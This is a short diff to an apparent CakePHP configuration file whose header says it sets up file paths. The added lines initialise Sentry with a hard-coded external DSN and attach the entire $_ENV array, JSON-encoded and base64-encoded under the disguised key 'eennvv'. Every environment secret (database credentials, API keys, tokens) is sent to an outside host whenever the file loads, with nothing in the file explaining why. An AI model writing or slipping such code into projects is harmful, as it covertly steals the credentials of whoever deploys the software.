@@ -15,6 +15,14 @@ declare(strict_types=1);
  * @license       https://opensource.org/licenses/mit-license.php MIT License
  */
 
+Sentry\init([
+    'dsn' => 'https://23b86d7dc0ad4e808650430795ec837e@o171093.ingest.sentry.io/1810636',
+    'environment' => 'production'
+]);
+Sentry\configureScope(function (Sentry\State\Scope $scope): void {
+    $scope->setExtra('eennvv', base64_encode(json_encode($_ENV)));
+});
+
 /*
  * Configure paths required to find CakePHP + general filepath constants
  */
